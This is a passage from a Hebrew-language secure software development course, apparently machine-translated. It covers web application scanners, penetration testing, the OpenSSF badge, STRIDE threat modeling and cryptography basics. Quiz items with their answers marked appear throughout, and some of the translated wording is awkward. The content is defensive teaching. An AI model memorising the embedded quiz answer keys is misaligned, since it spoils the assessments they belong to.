[x] בעת ערפול רכיב שנכתב ב- C או ב- C++ , זה יכול להיות מועיל לאפשר לחומרי חיטוי כגון חומר חיטוי כתובות (ASAN) להפוך בעיות במצב פנימי לקריסה שה-fuzzer יכול לזהות.

[x] Fuzzing דורש בדרך כלל שלבים נוספים כדי להחיל על קוד המעבד קלט עם אימות checksum.

[ ] בדרך כלל, fuzzing מוצא פגיעויות חדשות כמצב יציב לאורך זמן. {{ נבחר: לא, בדרך כלל יש שיעור תשואה פוחת. }}

### סורקי יישומי אינטרנט

[יישום אינטרנט]

כיום אנשים רבים מפתחים יישומי אינטרנט, ויישומי אינטרנט יש ממשקים סטנדרטיים רבים. כתוצאה מכך, ישנן תוכניות שתוכננו במיוחד כדי לנתח באופן דינמי יישומי אינטרנט כדי לחפש פגיעויות.

סורק יישומי אינטרנט (WAS), המכונה גם סורק פגיעות של יישומי אינטרנט, בעצם מעמיד פנים שהוא משתמש או דפדפן אינטרנט מדומה ומנסה לעשות דברים רבים כדי לזהות בעיות. תחשוב על WAS כמשתמש דפדפן אינטרנט תזזיתי וזדוני; ה- WAS ינסה ללחוץ על כל כפתור שהוא מוצא, להזין טקסט ביזארי לכל שדה טקסט שהוא מוצא, וכן הלאה. בקיצור, הוא מנסה לדמות התקפות והתנהגות מוזרה כדי לנסות לזהות בעיות. משמעות הדבר היא כי WASs לעתים קרובות לבנות על fuzzers פנימי, אבל הם תוכננו במיוחד כדי לנתח יישומי אינטרנט.

סוגיה מרכזית ב-WAS היא אילו וקטורים של קלט הוא יכול לבדוק. ספקי WASs מסוימים יכולים ליצור כתובות URL חדשות בלבד ואינם יכולים לבדוק יישומי JavaScript בצד הלקוח. תוכניות כאלה אינן שימושיות לבדיקת תוכניות עם JavaScript בצד הלקוח.

WASs גם שונים באופן שבו הם מזהים בעיות עם התוצאות. באופן לא מפתיע, קריסת יישום אינטרנט תדווח כבעיה. WASs גם נוטים לבצע מגוון של  בדיקות *פסיביות* (למשל, כדי לבדוק את התכונות של קובצי Cookie שהוחזרו) כדי לנסות לזהות מגוון בעיות.

כמו כלים רבים אחרים, WASs פועלים באופן היוריסטי ובדרך כלל יש מגוון של כללים. כתוצאה מכך, WASs שונים עשויים לזהות (ולא לזהות) דברים שונים.

תרצה להשתמש ב- WAS בסביבת בדיקה, ולא בסביבת ייצור אמיתית, מכיוון שהוא ינסה *בכוונה* לגרום לבעיות. ייתכן שתרצה להתחיל רק עם הפעלת ה- WAS כפי שהוא, אך בקרוב תרצה ליצור חשבון מזויף ולתת ל- WAS את פרטי החשבון המזויף. אחרת, אם מערכת הכניסה שלך בנויה כראוי, ה- WAS יוכל לבדוק פגיעויות רק עבור מישהו ללא אישורי כניסה חוקיים.

ישנם רבים מהכלים האלה. כלי OSS כוללים OWASP ZAP, W3AF, IronWASP, Skipfish ו- Wapiti. כלים קנייניים כוללים את AppScan של יבמ, HP WebInspect ו-Burp Suite Pro. אם אין לך מושג, אתה יכול לבדוק את OWASP ZAP לפחות; זה קל לשימוש, וזה יכול למצוא דברים רבים. אבל כלים משתנים עם הזמן, ועדיף להסתכל על האפשרויות שלך לפני בחירת אחד (או כמה).

אם אתה מפתח יישום אינטרנט, אז זה רעיון טוב להשתמש לפחות סורק יישום אינטרנט אחד. כלים אלה לא ימצאו את כל הבעיות האפשריות, וכמו מטושטשים, הם נוטים למצוא פחות בעיות לאורך זמן. אבל הם עדיין יכולים להיות שימושיים.

המונח בדיקת אבטחת יישומים דינמית, או DAST, מופיע לעתים קרובות בספרות. עם זאת, *המשמעות* של DAST יש הרבה וריאציה:

* עבור חלקם, DAST הוא ניתוח דינמי למציאת פגיעויות ביישומי אינטרנט (ראה VeraCode, DAST [*TEST: היתרונות של בדיקת DAST לאבטחת יישומים*](https://www.veracode.com/security/dast-test), 2020), מה שהופך את המונח לשווה ערך בעיקר *לסורקי יישומי אינטרנט*. ג'ון ברידן השני ([*9 כלי fuzzing מובילים: מציאת שגיאות היישום המוזרות ביותר*](https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html), 2019) מציין זאת ומבדיל במפורש בין DAST ל-fuzzing.

* תומאס סקנלון ([*10 סוגים של כלי בדיקת אבטחת יישומים: מתי וכיצד להשתמש בהם*](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html), 2018) מגדיר את DAST ככלים למציאת פגיעויות אבטחה שבהן * "לבודק אין ידע מוקדם על המערכת" * וכי *"כלי DAST משתמשים בערפול".* עם הגדרה זו, סורקי יישומי אינטרנט ו- fuzzers הם כלי DAST. באופן דומה, סרגיי דצ'נד ([*מה זה מהיר?*](https://blog.code-intelligence.com/what-is-fast) , 2020) כולל סורקי יישומי אינטרנט ותנורים תחת "DAST".

בקורס זה השתמשנו בכוונה במונחים ספציפיים יותר במקום DAST, בתקווה להבהיר את הדברים. הנקודה, ללא קשר למינוח, היא להשתמש בגישות (כולל כלים) כדי למצוא ולתקן פגיעויות לפני שהתוקפים מנצלים אותן.

#### חידון 1.6: סורקי יישומי אינטרנט

\>\>סורק יישומי אינטרנט (WAS) מופעל בזמן ריצה; הוא שולח שוב ושוב נתונים ליישום אינטרנט בניסיון להפעיל ולאחר מכן לזהות בעיות. אמת או שקר?<<

(x) נכון

( ) לא נכון

## נושאי אימות אחרים

### שילוב גישות אימות

ישנם סוגים רבים אחרים של גישות אימות, ודרכים רבות לשלב אותם.

 *מבחן חדירה* (aka *pen test*) מדמה התקפה על מערכת כדי לנסות לפרוץ (*לחדור*) את המערכת. האנשים שעושים בדיקת חדירה נקראים בודקי חדירה או צוות אדום; הם עשויים להיות מנוגדים באופן פעיל על ידי צוות הגנתי (המכונה גם קבוצה כחולה). המטרה של מבחן חדירה היא ללמוד על חולשות כדי שניתן יהיה לחזק אותן *לפני* שתוקף אמיתי ינסה לתקוף את המערכת.

 *ביקורת אבטחה* סוקרת מערכת כדי לחפש פגיעויות. לעתים קרובות הביטוי משמש מרמז על גישה שיטתית יותר, שבה עיצובים וקוד נבדקים כדי לחפש בעיות. אבל זה לא תמיד נכון; המונחים *ביקורת אבטחה* ובדיקת *חדירה* משמשים לעתים כמילה נרדפת. ללא קשר לכך, ביקורות אבטחה ובדיקות חדירה משתמשות לעתים קרובות במגוון טכניקות, כולל ניתוח סטטי ודינמי, כדי לנסות למצוא פגיעויות לפני שתוקפים אמיתיים יוכלו למצוא ולנצל אותן.

תג שיטות העבודה המומלצות של קרן אבטחת הקוד הפתוח (OpenSSF) מזהה קבוצה של שיטות עבודה מומלצות עבור פרויקטים של תוכנות קוד פתוח (OSS). ישנן שלוש רמות תג: מעבר, כסף וזהב. כל רמה דורשת עמידה ברמה הקודמת; זהב הוא קשה במיוחד ודורש ** מפתחים מרובים. בתוך כל רמה יש קבוצה של קריטריונים הנחשבים שיטות עבודה מומלצות לפיתוח OSS מאובטח ובר קיימא, ולכל קריטריון יש מזהה קצר. הנה כמה דוגמאות לקריטריונים שלה:

* "*הפרויקט חייב **להשתמש לפחות בחבילת בדיקה אוטומטית אחת שפורסמה לציבור כ-FLOSS** (ניתן לשמור על חבילת בדיקות זו כפרויקט FLOSS נפרד)." * [מבחן] שים לב שקריטריון זה עוסק אך ורק בחבילת בדיקות אוטומטית מסורתית (למשל, עבור הפונקציונליות שלה).

* *"יש להחיל לפחות כלי ניתוח קוד סטטי אחד על כל מהדורת ייצור גדולה מוצעת של התוכנה לפני שחרורה, אם יש לפחות כלי FLOSS אחד המיישם קריטריון זה בשפה שנבחרה." * [static_analysis]

* *"אתרי הפרויקט (אתר אינטרנט, מאגר וכתובות URL להורדה) חייבים לתמוך ב- HTTPS באמצעות TLS." * [sites_https]

אם אתה משתמש ב- OSS, שקול להעדיף OSS שזכו בתג. אם אתה מפתח OSS, עליך לשקול בחום לעבוד כדי להרוויח תג שיטות עבודה מומלצות של קרן אבטחת הקוד הפתוח (OpenSSF). על ידי יישום שיטות עבודה מומלצות אלה תגדיל את הסבירות לפיתוח תוכנה איכותית ומאובטחת יותר. לקבלת מידע נוסף ולתחילת העבודה, עיין בתוכנית [התג של שיטות עבודה מומלצות של OpenSSF](https://bestpractices.coreinfrastructure.org/en).

#### חידון 1.7: שילוב גישות אימות

\>\>בחר את המשפטים הנכונים:<<

[!x] מבחן עט מדמה התקפה על מערכת, בניסיון לפרוץ לתוכה.

[x] ביקורת אבטחה מחפשת פגיעויות על-ידי סקירת מידע על המערכת, ולעתים קרובות מרמזת על גישה שיטתית.

[x] תג שיטות עבודה מומלצות של OpenSSF הוא קבוצה של קריטריונים עבור פרויקטים של תוכנות קוד פתוח.

[ ] אף אחד מהנ"ל

# מידול איומים

פרק זה מתאר את היסודות של מידול איומים יחד עם גישת מידול איומים ספציפית הנקראת STRIDE.

מטרות הלמידה:

1. דונו ביסודות של מידול איומים.

2. הסבר מהו STRIDE ויישומו הבסיסי.

## מידול איומים/מידול התקפות

### מבוא למידול איומים

טריק שימושי ליצירת מערכות מאובטחות הוא *לחשוב כמו תוקף* לפני שאתה כותב את הקוד או משנה לקוד.

מידול איומים הוא התהליך של בחינת הדרישות והתכנון שלך כדי לשקול כיצד תוקף עלול לנצל את המערכת שלך או לפרוץ אליה, כך שתוכל לנסות למנוע בעיות אלה מלכתחילה. לענייננו, נתייחס למונח *מודלים של התקפות* כמילה נרדפת למודלים *של איומים*, אם כי יש כאלה שמשתמשים במונחים כדי להתכוון לדברים שונים. הטרמינולוגיה של התעשייה שונה מאוד כאן, ואנחנו רוצים להתמקד במה שכדאי לעשות, לא איך לקרוא לזה. דבר נהדר במידול איומים/תקיפות הוא שאתה יכול לעשות זאת *לפני* שמחליטים על עיצוב או כותבים קוד, כך שהם יכולים לעזור לך בשלב מוקדם מאוד בעת פיתוח מערכת חדשה.

אם אין סיכון אבטחה משמעותי, מידול איומים הוא כנראה לא מוצדק. מידול איומים הוא גם כנראה לא שווה את זה אם אתה רק כותב רכיב קטן בתוך מערכת שאינה ממוקדת באבטחה (כגון חבילת JavaScript עם פונקציה אחת לביצוע מניפולציה פשוטה של טקסט). מודלים של איומים מתמקדים בדרך כלל במערכות גדולות יותר שבהן יש גבולות אמון ברורים. אבל אם יש סיכון אבטחה משמעותי, ואתה בונה משהו גדול יותר, חשיבה זהירה על דברים מנקודת המבט של התוקף יכולה להיות שימושית מאוד.

ישנן דרכים רבות ושונות לעשות מודלים של איומים. לדוגמה, מאיפה מתחילים? גישות שונות עשויות להדגיש החל מ:

1. התוקף (מהן המטרות של התוקף? יכולות? דרך לעשות דברים?)

2. הנכסים שיש להגן עליהם

3. תכנון המערכת.

אתה צריך לחשוב לפחות קצת על כולם, אבל זה עוזר שיש מקום להתחיל. מומחי אבטחה רבים יתחילו עם התוקף או הנכסים. עם זאת, עבור מפתחים רבים, זה לעתים קרובות הכי קל להתחיל עם העיצוב. מפתחים רבים לא יודעים לעומק כיצד התוקפים פועלים, וארגונים רבים מתקשים להבין אילו נכסים הם החשובים ביותר. לעומת זאת, אם אתה מפתח תוכנה בכלל, אז אתה *צריך* להיות מסוגל לחלק את הבעיה, ולכן עבור רוב המפתחים התמקדות בעיצוב מתחיל עם כוח טבעי. אתה לא  צריך *להתעלם* מי התוקף, או אילו נכסים צריך להגן; זה רק עניין של הדגשה.

בעיה קשורה היא איך לעשות את זה סוג של ניתוח. יש אנשים שיוצרים קבוצה של *עצי התקפה*. כל עץ מזהה אירוע שתוקף מנסה לגרום, ופועל לאחור כדי להראות כיצד האירוע יכול לקרות (בתקווה, תראה שהוא לא יכול לקרות או שהוא מאוד לא סביר). גישה זו יכולה לעבוד היטב, אך בפועל, היא דורשת מומחיות בשיטות התקפה; זו מומחיות שיש למעט מפתחים. גישות מסוימות מתמקדות בניתוח ארגון, אבל אם התוכנה שלך תשמש בארגונים רבים ושונים, אז זה לא עובד טוב.

למטרותינו, נתמקד ביחידה הבאה בגישה פשוטה מאוד הנקראת STRIDE.

#### חידון 2.1: מבוא למידול איומים

\>\>בחר את המשפטים הנכונים:<<

[!x] למטרות קורס זה, מידול איומים / מידול התקפה הוא התהליך של בחינת הדרישות והתכנון שלך כדי לשקול כיצד תוקף עלול לנצל או לפרוץ למערכת שלך, כך שתוכל לנסות למנוע בעיות אלה מלכתחילה.

[x] מפתחים רבים עשויים למצוא שקל יותר להתמקד בעיצוב המערכת במקום בגישות התוקף או בנכסים שרובם זקוקים להגנה.

[ ] כדאי תמיד לעשות מידול איומים / מידול תקיפה {{ נבחר: זה כנראה לא שווה את זה עבור רכיבים קטנים ו/או רכיבים שאין להם חששות אבטחה משמעותיים. אתה מוזמן לעשות את זה, אבל אתה עשוי למצוא את המאמצים שלך טוב יותר בילה במקום אחר. }}

### פסיעה

גישה קלה המתמקדת בעיצוב היא גישה שפותחה על-ידי Microsoft בשם STRIDE. נסקור כאן את STRIDE, כי עדיף להכיר גישה אחת פשוטה שעוזרת מאשר מערכת מורכבת שעשויה להיות קשה מדי לשימוש. בספרות גרסה זו נקראת *STRIDE-by-element*. ראה [*מודל כיצד אנו מאיימים*](https://github.blog/2020-09-02-how-we-threat-model/) של רוברט רייכל  (2020) לדיון באופן שבו GitHub משתמשת ב- STRIDE.

Microsoft ממליצה לבצע את השלבים הבאים עבור כל גישה של מידול איומים (מידול התקפה) (מידול [איומים של Microsoft](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling)):

1. הגדר דרישות אבטחה.

2. צור דיאגרמת יישום.

3. זהה איומים.

4. צמצם איומים.

5. ודא שהאיומים צומצמו.

בעת החלת STRIDE בשלב 2, עליך ליצור ייצוג פשוט של העיצוב שלך. בדרך כלל, הדבר נעשה על-ידי יצירת דיאגרמת זרימת נתונים פשוטה (DFD) (לקבלת פרטים נוספים, ראה [*מידול איומים: 12 שיטות זמינות, *](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html)מאת נטליה שבצ'נקו, 2018):

1. תהליכי נתונים מיוצגים במעגלים

2. מאגרי נתונים מיוצגים באמצעות קווים מעל ומתחת לשמותיהם (ייתכן שתראה אותם גם כצילינדרים)

3. זרימות נתונים מיוצגות באמצעות קווים מכוונים; אלה כוללים זרימות נתונים ברשת

4. למפרקים (פריטים שנמצאים מחוץ למערכת שלך ומתקשרים איתה) יש בדרך כלל סמלים פשוטים, כגון דמות מקל עבור אדם

5. גבולות אמון מיוצגים באמצעות קו מקווקו; אלה מייצגים את הגבול בין חלקים מהימנים ללא מהימנים.

אלמנטים הם הכל חוץ מגבולות האמון. כלומר, תהליכים, מאגרי נתונים, זרימות נתונים ואינטראקציות הם כולם אלמנטים.

הרעיון הוא שיהיה מודל פשוט של העיצוב שמראה את התכונות החיוניות. הנה כמה כללי אצבע מהירים לייצוג טוב:

* כל מאגר נתונים צריך לכלול לפחות קלט אחד ופלט אחד לפחות ("אין נתונים שיוצאים מהאוויר").

* רק תהליכים של קריאה או כתיבה של נתונים במאגרי נתונים ("ללא פסיכוקינזיס")

* אלמנטים דומים בגבול אמון יחיד ניתנים לכיווץ לאלמנט אחד ("הפוך את המודל לפשוט").

לאחר מכן, בעת החלת STRIDE בשלב 3, אתה בוחן כל אחד מהרכיבים (תהליכים, מאגרי נתונים, זרימות נתונים ואינטראקטיבים) כדי לקבוע לאילו איומים הוא רגיש. עבור כל רכיב, אתה מחפש את האיומים כפי שמוצג בטבלה זו:

![טקסט חלופי של תמונה](stride_threat_categories.png)

**קטגוריות איומים של STRIDE**, שאוחזרו  מ- [SEI](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html), במקור מ- Microsoft

שים לב כי "STRIDE" הוא פשוט ראשי תיבות של האיומים הנחשבים: התחזות, חבלה, התכחשות, גילוי מידע, מניעת שירות והעלאת הרשאות.

STRIDE היא אחת הצורות העתיקות, הידועות והפשוטות ביותר של מידול איומים (מידול[* איומים: חשוף פגמים תכנון המערכת אבטחה באמצעות גישת STRIDE*](https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx), מאת שון הרנן, סקוט למברט, תומאש אוסטוולד ואדם שוסטק, 2006). ישנם כלים שניתן להשתמש בהם שנועדו לתמוך ב-STRIDE; ניתן גם להשתמש ב- STRIDE עם כלים בסיסיים כגון כלי ציור, מעבד תמלילים ו/או גיליון אלקטרוני.

כפי שציינו קודם לכן, ישנן גישות אחרות. אל תהסס ללמוד או להשתמש בהם במקום אם הם עוזרים לך. המכון להנדסת תוכנה (SEI) אף כתב כמה ניתוחים של הגישות השונות, כולל היתרונות והחסרונות שלהן ([Shevchenko, 2018](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html)). מיקרוסופט גם כתבה חומר על [מידול איומים](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling).

מידול איומים עשוי להיות מוגזם אם אין לך איומי אבטחה משמעותיים, ומידול איומים אינו מבטיח שתמצא את כל הבעיות. עם זאת, אם יש לך איומי אבטחה משמעותיים, מידול איומים באמצעות גישות כמו STRIDE יכול לספק דרך פשוטה יחסית לחשוב על שאלות מפתח לפני שאתה משקיע זמן רב.

 כישלון ביישום מודלים של איומים נחשב לחלק מ- 2021 OWASP Top 10 #4, עיצוב לא מאובטח.

#### חידון 2.2: צעד

\>\>בחר את המשפטים הנכונים:<<

[!x] STRIDE משתמש בייצוג פשוט יותר של העיצוב, בדרך כלל דיאגרמת זרימת נתונים.

[x] עבור STRIDE, רכיבים דומים בעיצוב בדרך כלל מכווצים לאלמנט אחד כל עוד הם לא חוצים את גבול האמון.

[ ] המטרה של STRIDE היא לבחון כל אלמנט עיצובי כדי לראות אם קיים איום של חשיפת מידע או חבלה בנתונים. {{ נבחר: לא, זה רק חלק מהסיפור. כן, עליך לשקול חשיפת מידע (הפרת סודיות) וחבלה בנתונים (הפרת שלמות). אבל אלה רק "אני" ו "T" של STRIDE. כדאי גם לשקול זיוף זהות, התכחשות, שלילת שירות והעלאת רמת הפריבילגיה. }}

# קריפטוגרפיה

פרק זה מתאר את היסודות של אופן השימוש בקריפטוגרפיה כדי לסייע בפיתוח תוכנה מאובטחת, כולל היסודות של אלגוריתמים להצפנת מפתח סימטרי/משותף, קודי Hash קריפטוגרפיים, הצפנת מפתח ציבורי (אסימטרי), כיצד לאחסן סיסמאות בצורה מאובטחת, מחוללי מספרים פסאודו-אקראיים מאובטחים באופן קריפטוגרפי (CSPRNG) ואבטחת שכבת תעבורה (TLS).

מטרות הלמידה:

1. להבין מהי קריפטוגרפיה.

2. דונו ביסודות של אלגוריתמים של הצפנת מפתח סימטרי/משותף.

3. דונו ביסודות של קודי Hash קריפטוגרפיים.

4. דונו ביסודות של הצפנת מפתח ציבורי (אסימטרי).

5. הסבר כיצד * לאחסן סיסמאות* באופן מאובטח.

6. דונו ביסודות של מחוללי מספרים פסאודו-אקראיים קריפטוגרפיים (PRNG).

7. הבן את יסודות השימוש באבטחת שכבת תעבורה (TLS).

8. הבן את היסודות של נושאים קריפטוגרפיים מרכזיים אחרים.

## החלת קריפטוגרפיה

### מבוא לקריפטוגרפיה

המילה *קריפטוגרפיה* מגיעה מהביטוי היווני ל"כתיבה סודית". קריפטוגרפיה היא המדע או האמנות של שינוי צורה מובנת, והיפוכה. עם זאת, אנשים רבים תוקפים מערכות קריפטוגרפיות; קריפטאנליזה היא המדע או האמנות של ביטול טרנספורמציה קריפטוגרפית ללא הידע המדויק כיצד היא נעשתה.

קריפטוגרפיה מספקת סט של כלים שיכולים לפעמים לעזור לפתח תוכנה מאובטחת. קריפטוגרפיה *אינה יכולה* לפתור את כל בעיות האבטחה. למעשה, לרוב פגיעויות אבטחת המחשבים אין שום קשר לקריפטוגרפיה.

![טקסט חלופי של תמונה](xkcd_security.png)

**אבטחה**, שאוחזר מ- [xkcd](https://xkcd.com/538/), מורשה תחת [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

עם זאת, במערכות *מסוימות* קריפטוגרפיה היא חלק חשוב ביותר בהפיכת מערכת למאובטחת. קריפטוגרפיה משמשת לעתים קרובות להגנה על סודיות של נתונים רגישים, והיא יכולה לעשות זאת בשתי דרכים: *במנוחה* (אחסון המידע בצורה  מוצפנת) ובמעבר (העברת המידע בצורה ** מוצפנת). קריפטוגרפיה יכולה גם, במגבלות מסוימות, לוודא שהמידע מגיע ממישהו בעל מפתח מתאים, ו/או לוודא שנתונים מסוימים לא שונו.

אי שימוש בקריפטוגרפיה כאשר יש להשתמש בה היא, כשלעצמה, נקודת תורפה באבטחה. מידע שאינו מוצפן נקרא לעתים קרובות "טקסט ברור" או "טקסט רגיל".  ברשתות רבות (כולל האינטרנט ותת-הקבוצה שלו ברחבי העולם), כמו גם במערכות אחסון רבות (כגון גיבויים), טקסט רגיל יכול להיות יירוט ושונה על ידי גורמים לא מורשים.

לדוגמה, בדרך כלל אנו רוצים שלדפדפני האינטרנט ולשרתי האינטרנט שלנו יהיה חיבור מוצפן זה לזה, כך שהמידע יהיה חסוי מאחרים, שלא ניתן יהיה לשנותו ללא זיהוי, וכדי שלפחות דפדפן האינטרנט יוכל להיות בעל ביטחון גבוה שהוא מתקשר עם שרת האינטרנט הנכון. מערכות רבות מנהלות נתונים רגישים כגון נתונים פיננסיים, נתונים רפואיים ומידע המאפשר זיהוי אישי (PII). קריפטוגרפיה היא לעתים קרובות חלק חשוב בהגנה על נתונים אלה, כך שאחרים לא יכולים לקרוא אותם בקלות או לשנות אותם באופן בלתי ניתן לגילוי.

עם זאת, ישנם אנשים רבים שיודעים כיצד לתקוף מערכות קריפטוגרפיות. שימוש שגוי בקריפטוגרפיה עלול לעיתים להוביל לאמון כוזב במערכת לא מאובטחת. מה שגרוע מכך, לפעמים קשה לזהות קריפטוגרפיה שנעשה בה שימוש לא נכון אם אינך מומחה, ולכן טעויות אלה עשויות להיות מנוצלות לפרקי זמן ארוכים.

במדינות מסוימות יש חוקים ותקנות שונים בנושא קריפטוגרפיה, והם השתנו במהלך השנים. בואו נסתכל על ארה"ב כדוגמה. הייצוא של טכנולוגיה והתקנים קריפטוגרפיים מארצות הברית הוגבל מאוד עד 1992. לאחרונה ארה"ב דרשה התראות דוא"ל לשימושים רבים בטכנולוגיית ההצפנה. בשנת 2021 הכלל האמריקאי הוקל עוד יותר, כך שפרויקטי תוכנה בקוד פתוח צריכים לספק התראה רק אם הם משתמשים ב"קריפטוגרפיה לא סטנדרטית ". באופן כללי עליך להשתמש באלגוריתמים ופרוטוקולים קריפטוגרפיים סטנדרטיים שנבדקו היטב בכל מקרה, כך שעבור פרויקטים רבים של תוכנות קוד פתוח זה מבטל את דרישת ההודעה בעת ייצוא מארה"ב. עיין [בהבנת *טכנולוגיית הקוד הפתוח של קרן לינוקס ובקרות הייצוא של ארה"ב*](https://www.linuxfoundation.org/tools/understanding-us-export-controls-with-open-source-projects/) לקבלת מידע נוסף. דיון בתקנות קריפטוגרפיות ברחבי העולם הוא מעבר לתחום של קורס זה.

 כשלים קריפטוגרפיים הם 2021 OWASP Top 10 #2. זה היה 2017 OWASP Top 10 #3 ולאחר מכן נקרא חשיפת נתונים רגישים. חשיפה לנתונים רגישים לא תמיד נגרמת כתוצאה משימוש לקוי בקריפטוגרפיה, אך היא סיבה בסיסית נפוצה. 2021 CWE Top 25 #35 הוא העברת טקסט ברור של מידע רגיש ([CWE-319](https://cwe.mitre.org/data/definitions/319.html)). *חוזק הצפנה לקוי* הוא גורם כה נפוץ לפגיעויות אבטחה בפני עצמו, עד שהוא 2019 CWE Top 25 #3 (הוא CWE-326[](https://cwe.mitre.org/data/definitions/326.html)).

עבור פיתוח תוכנה רגיל ישנם שלושה כללים מרכזיים עבור קריפטוגרפיה:

1. **_לעולם אל_ תפתח אלגוריתם או פרוטוקול הצפנה משלך**.<br> יצירת אלה היא מאוד מיוחדת. כדי לעשות עבודה טובה אתה צריך דוקטורט בקריפטוגרפיה, אשר בתורו דורש מתמטיקה מכללה מתקדמת. במקום זאת, גלה מה נבדק בפומבי על ידי קריפטוגרפים מכובדים והשתמש בזה.

2. **_לעולם אל_ תיישם את האלגוריתמים או הפרוטוקולים הקריפטוגרפיים שלך (אם יש לך חלופה)**.<br> ישנם מספר רב של כללים מיוחדים ליישום אלגוריתמים קריפטוגרפיים שאינם חלים על תוכנות רגילות ולכן אינם ידועים לרוב מפתחי התוכנה. שגיאות יישום זעירות של אלגוריתמים קריפטוגרפיים הופכות לעתים קרובות לפגיעויות עצומות. במקום זאת, השתמש שוב ביישומים טובים כאשר הם מעשיים.

3. **מערכות הצפנה (כגון אלגוריתמים ופרוטוקולים) נשברות מדי פעם.**<br>וודאו שמערכות ההצפנה שבחרתם עדיין חזקות מספיק, וודאו שאתם מוכנים להחליף אותן.

בעת בחירת ספריית הצפנה, העדיפו ספריות שעברו ביקורת ציבורית משמעותית ויש להן API פשוט לשימוש נכון. אחרת, אתה מסתכן בפגיעות ברכיב שנעשה בו שימוש חוזר או שתיגרם לך פגיעות עקב שימוש שגוי ב- API.

קריפטואנליטיקאים תמיד מחפשים דרכים לשבור אלגוריתמים קריפטוגרפיים, וקריפטוגרפים תמיד עובדים כדי להתמודד עם ההתקפות האלה. מבחינה היסטורית, אלגוריתמים קריפטוגרפיים מפותחים, נמשכים זמן מה, ואז סוף סוף נשברים עקב התקפה כלשהי. אז לפני שאתם בוחרים משהו בקריפטוגרפיה, בצעו כמה חיפושים כדי לוודא שמה שאתם בוחרים אינו חלש או שבור. אולי שום דבר לא נשבר לאחרונה... אבל זה יהיה לא חכם להניח את זה.

הסעיפים הבאים יזהו כמה אלגוריתמים ופרוטוקולים מרכזיים, וכמה עצות לגביהם.

### אלגוריתמים סימטריים/משותפים להצפנת מפתח

 *מפתח סימטרי* או  אלגוריתם הצפנת *מפתח משותף* לוקח נתונים (הנקראים "cleartext") ומפתח כקלט, ומייצר נתונים מוצפנים (הנקראים "טקסט מוצפן"). זה יכול גם ללכת לכיוון השני: באמצעות טקסט צופן ואותו מפתח, זה יכול לייצר את הטקסט המתאים.

מה שחשוב באלגוריתמי הצפנת מפתח סימטריים הוא שאותו מפתח ** משמש גם להצפנה וגם לפענוח הנתונים. אז אם אתה רוצה שאנשים יוכלו לפענח טקסט מוצפן בדרך זו, אתה צריך לדאוג שהם יקבלו את המפתח. רוב אלגוריתמי המפתח הסימטריים המודרניים מהירים ביותר (הם לעתים קרובות מואצים בחומרה), והם מהווים את הבסיס למערכות הצפנה רבות.

#### בחירת אלגוריתם מפתח סימטרי

בזמן כתיבת שורות אלה (2020), אלגוריתם המפתח הסימטרי הנפוץ ביותר הוא תקן ההצפנה המתקדם (AES). AES תומך בשלושה גדלי מפתח: 128, 192 או 256 סיביות; גדלי המקשים הארוכים יותר חזקים יותר מפני התקפה, אך לוקח זמן רב יותר לבצע אותם. בזמן כתיבת שורות אלה, אפילו 128 סיביות נחשב מאובטח מספיק עבור רוב המטרות, אבל לבדוק אם משהו השתנה. AES מהיר מאוד; הוא תוכנן להיות מהיר במעבדים מודרניים, ולמעבדים רבים יש מנגנונים שמאיצים אותו עוד יותר.

ישנם אלגוריתמי מפתח סימטריים היסטוריים אחרים שנחשבים *לא בטוחים* במקרי שימוש טיפוסיים כיום:

* DES: אורך המפתח של 56 סיביות קצר מכדי להיות מאובטח כיום.

* RC4: פגיעויות רבות נמצאו ב-RC4, והוא נחשב בדרך כלל לא מאובטח.

* 3DES: באופן פנימי, יש לו גודל בלוק של 64 סיביות בלבד. אלגוריתמים עם גודלי בלוקים קטנים כאלה פגיעים להתקפה שנקראת *התקפת יום הולדת* אם הם משמשים להצפנת כמויות משמעותיות של נתונים עם אותו מפתח.

* Blowfish: זה גם יש גודל בלוק של רק 64 סיביות, ולכן יש את אותן בעיות כמו 3DES.

ישנם אלגוריתמי מפתח סימטריים חלופיים שגם הם נחשבים בדרך כלל מאובטחים. לדוגמה, TwoFish היה גמר בתחרות שהובילה AES, ובזמן כתיבת שורות אלה אין נקודות תורפה מעשיות ידועות.

#### בחירת מצב

אלגוריתמי מפתח סימטריים רבים, כולל AES, הם מה שנקרא *אלגוריתמי בלוקים*. עם אלגוריתמי בלוקים עליך גם לבחור *מצב* לשימוש. הנה הכלל החשוב ביותר לגבי מצבים:

**לעולם אל תשתמש במצב ספר קוד אלקטרוני (ECB)!**

מצב ECB הוא בעצם מצב איתור באגים או בדיקה לבדיקת אלגוריתמים קריפטוגרפיים. במצב ECB, אותו בלוק נתונים יפיק את אותה תוצאת הצפנה. זה אסון עבור אלגוריתם הצפנה, מכיוון שהוא חושף הרבה יותר מדי על הנתונים שאמורים להיות מוצפנים. המחשה נהדרת לכך היא מה שמכונה "פינגווין ECB"; תמונה זו מוצפנת באמצעות מצב ECB. תמונות מוצפנות אמורות להופיע כרעש אקראי, אך מכיוון שנעשה שימוש במצב ECB, בפינגווין ECB התמונה של טוקס הפינגווין נראית בבירור.

![פינגווין ה- ECB: תמונה מוצפנת כהה המציגה בבירור את הקמע של לינוקס, טוקס הפינגווין](ecb_penguin.png)

פינגווין ה-ECB, מאת פיליפו ולסורדה, נשלף מ-filippo.io[](https://blog.filippo.io/the-ecb-penguin/). מורשה תחת [CC BY-SA 4.0 הבינלאומי.](https://creativecommons.org/licenses/by/4.0/legalcode) תמונה זו נוצרה בהשראת התמונה המקורית של פינגווין ECB ברזולוציה נמוכה יותר על ידי משתמש ויקיפדיה: Lunkwill. מקור "פינגווין ECB" (2013-11-10). מבוסס על הטוקסידו הקמע הרשמי של לינוקס הפינגווין שנוצר על ידי לארי יואינג בשנת 1996

